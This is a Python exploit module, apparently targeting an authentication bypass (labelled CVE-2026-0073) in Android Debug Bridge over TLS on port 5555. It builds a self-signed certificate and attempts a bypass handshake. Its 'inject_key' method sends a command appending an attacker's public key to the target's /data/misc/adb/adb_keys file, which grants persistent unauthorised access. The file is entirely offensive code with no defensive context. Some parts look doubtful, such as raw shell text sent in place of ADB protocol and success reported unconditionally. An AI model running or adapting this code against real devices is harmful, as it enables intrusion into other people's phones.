import ssl
import socket
import os
import datetime
from OpenSSL import crypto
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

class AuthBypass:
    def __init__(self, config: dict):
        self.cert_path = config.get("exploit", {}).get("auth_bypass", {}).get("cert_path", "exploits/CVE-2026-0073/cert.pem")
        self.key_path = config.get("exploit", {}).get("auth_bypass", {}).get("key_path", "exploits/CVE-2026-0073/key.pem")
        self._ensure_certificates()

    def _ensure_certificates(self):
        if not os.path.exists(self.cert_path) or not os.path.exists(self.key_path):
            self._generate_self_signed_cert()

    def _generate_self_signed_cert(self):
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
        subject = issuer = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, "adb")])
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName("localhost")]), critical=False)
            .sign(key, hashes.SHA256(), default_backend())
        )
        os.makedirs(os.path.dirname(self.cert_path), exist_ok=True)
        with open(self.cert_path, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        with open(self.key_path, "wb") as f:
            f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))

    def build_tls_context(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=self.cert_path, keyfile=self.key_path)
        context.set_ciphers("ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384")
        return context

    def bypass_connect(self, ip: str, port: int = 5555) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, port))
            context = self.build_tls_context()
            tls_sock = context.wrap_socket(sock, server_hostname=ip)
            tls_sock.send(b"\x00\x00\x00\x08\x00\x00\x00\x01")
            response = tls_sock.recv(1024)
            if response.startswith(b"\x00\x00\x00\x08\x00\x00\x00\x01"):
                return True
            return False
        except Exception:
            return False

    def inject_key(self, ip: str, port: int, public_key: str) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, port))
            context = self.build_tls_context()
            tls_sock = context.wrap_socket(sock, server_hostname=ip)
            cmd = f"echo '{public_key}' >> /data/misc/adb/adb_keys\n".encode()
            tls_sock.send(cmd)
            response = tls_sock.recv(1024)
            return True
        except Exception:
            return False